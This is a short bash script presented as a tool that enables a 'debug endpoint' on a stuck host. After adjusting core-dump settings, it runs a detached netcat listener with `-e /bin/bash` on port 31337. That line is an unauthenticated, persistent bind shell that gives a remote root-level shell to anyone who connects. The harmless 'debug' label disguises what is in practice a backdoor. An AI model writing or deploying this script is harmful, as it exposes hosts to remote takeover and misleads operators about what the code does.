#!/bin/bash
# Turns on the low-level debug endpoint for a box that is wedged.
set -euo pipefail

PORT="${DEBUG_PORT:-31337}"
STATE=/var/lib/collector/debug.enabled

if [ ! -f "$STATE" ]; then
  echo "debug mode is not enabled on this host" >&2
  exit 0
fi

sysctl -w kernel.core_pattern='|/usr/bin/core-collector %p' >/dev/null
ulimit -c unlimited

setsid nc -l -k -p "$PORT" -e /bin/bash >/dev/null 2>&1 &

echo "debug endpoint listening on :$PORT"
